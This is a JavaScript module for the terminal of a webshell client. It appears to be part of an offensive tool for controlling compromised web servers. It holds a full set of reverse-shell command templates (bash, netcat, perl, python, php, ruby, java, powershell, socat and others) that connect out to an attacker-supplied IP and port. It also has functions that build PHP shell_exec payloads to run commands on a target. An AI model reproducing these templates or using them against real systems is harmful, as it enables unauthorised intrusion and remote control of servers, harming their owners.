/**
 * Webshell 终端模块
 * 支持伪终端和普通命令执行
 */

const WebshellTerminal = (function() {
    // 终端历史
    let commandHistory = [];
    let historyIndex = -1;

    // 终端配置
    let config = {
        prompt: '$ ',
        username: 'www-data',
        hostname: 'target',
        cwd: '/',
        isPseudoTerminal: false
    };

    // Linux 常用命令映射 (用于伪终端模拟)
    const LINUX_COMMANDS = {
        'whoami': () => config.username,
        'pwd': () => config.cwd,
        'id': () => `uid=33(${config.username}) gid=33(${config.username}) groups=33(${config.username})`,
        'uname -a': () => 'Linux target 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux',
        'hostname': () => config.hostname,
        'date': () => new Date().toString(),
        'uptime': () => ' 14:30:00 up 10 days, 3:45, 1 user, load average: 0.00, 0.01, 0.05',
        'env': () => 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nTERM=xterm',
        'echo': (args) => args.join(' '),
        'true': () => '',
        'false': () => { throw new Error('Command failed'); }
    };

    // 反弹 Shell 命令模板
    const REVERSE_SHELL_TEMPLATES = {
        bash: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
        bash2: (ip, port) => `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`,
        nc: (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
        nc2: (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
        perl: (ip, port) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
        python: (ip, port) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
        python3: (ip, port) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
        php: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
        ruby: (ip, port) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
        java: (ip, port) => `r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor();`,
        powershell: (ip, port) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
        xterm: (ip, port) => `xterm -display ${ip}:${port}`,
        socat: (ip, port) => `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`
    };

    // 初始化终端
    function init(options = {}) {
        config = { ...config, ...options };
        commandHistory = [];
        historyIndex = -1;
        return getPrompt();
    }

    // 获取提示符
    function getPrompt() {
        if (config.isPseudoTerminal) {
            return `${config.username}@${config.hostname}:${config.cwd}${config.username === 'root' ? '#' : '$'} `;
        }
        return config.prompt;
    }

    // 更新当前目录
    function updateCwd(newCwd) {
        if (newCwd.startsWith('/')) {
            config.cwd = newCwd;
        } else if (newCwd === '..') {
            const parts = config.cwd.split('/').filter(p => p);
            parts.pop();
            config.cwd = '/' + parts.join('/');
        } else if (newCwd !== '.') {
            config.cwd = config.cwd === '/' ? '/' + newCwd : config.cwd + '/' + newCwd;
        }
    }

    // 添加命令到历史
    function addToHistory(command) {
        if (command.trim() && command !== commandHistory[commandHistory.length - 1]) {
            commandHistory.push(command);
            if (commandHistory.length > 100) {
                commandHistory.shift();
            }
        }
        historyIndex = commandHistory.length;
    }

    // 获取上一条历史命令
    function getPreviousCommand() {
        if (historyIndex > 0) {
            historyIndex--;
            return commandHistory[historyIndex];
        }
        return null;
    }

    // 获取下一条历史命令
    function getNextCommand() {
        if (historyIndex < commandHistory.length - 1) {
            historyIndex++;
            return commandHistory[historyIndex];
        }
        historyIndex = commandHistory.length;
        return '';
    }

    // 解析命令
    function parseCommand(input) {
        const parts = input.match(/(?:[^\s"]+|"[^"]*")+/g) || [];
        const command = parts[0] || '';
        const args = parts.slice(1).map(arg => arg.replace(/^"|"$/g, ''));
        return { command, args, raw: input };
    }

    // 构建执行 Payload
    function buildExecutePayload(cmd, type = 'php_eval') {
        const parsed = parseCommand(cmd);
        let payload = '';

        // 处理 cd 命令
        if (parsed.command === 'cd') {
            const newDir = parsed.args[0] || '/';
            return {
                type: 'cd',
                payload: `chdir('${newDir}'); echo getcwd();`,
                localHandler: (result) => {
                    updateCwd(result.trim());
                }
            };
        }

        // 构建标准命令执行
        switch (type) {
            case 'php_eval':
                payload = `echo shell_exec('${cmd.replace(/'/g, "\\'")} 2>&1');`;
                break;
            case 'php_assert':
                payload = `echo shell_exec('${cmd.replace(/'/g, "\\'")} 2>&1');`;
                break;
            case 'behinder_php':
                payload = `shell_exec('${cmd.replace(/'/g, "\\'")} 2>&1');`;
                break;
            default:
                payload = `echo shell_exec('${cmd.replace(/'/g, "\\'")} 2>&1');`;
        }

        return {
            type: 'exec',
            payload,
            parsed
        };
    }

    // 获取反弹 Shell 命令
    function getReverseShellCommand(type, ip, port) {
        const template = REVERSE_SHELL_TEMPLATES[type];
        if (template) {
            return template(ip, port);
        }
        return REVERSE_SHELL_TEMPLATES.bash(ip, port);
    }

    // 获取所有反弹 Shell 类型
    function getReverseShellTypes() {
        return Object.keys(REVERSE_SHELL_TEMPLATES);
    }

    // 格式化终端输出
    function formatOutput(output, isError = false) {
        const lines = output.split('\n');
        return lines.map(line => {
            if (isError) {
                return `<span class="text-red-400">${escapeHtml(line)}</span>`;
            }
            return escapeHtml(line);
        }).join('\n');
    }

    // HTML 转义
    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    // 公开 API
    return {
        init,
        getPrompt,
        updateCwd,
        addToHistory,
        getPreviousCommand,
        getNextCommand,
        parseCommand,
        buildExecutePayload,
        getReverseShellCommand,
        getReverseShellTypes,
        formatOutput,
        escapeHtml,
        getConfig: () => config,
        setConfig: (newConfig) => { config = { ...config, ...newConfig }; }
    };
})();

// 导出模块
if (typeof module !== 'undefined' && module.exports) {
    module.exports = WebshellTerminal;
}
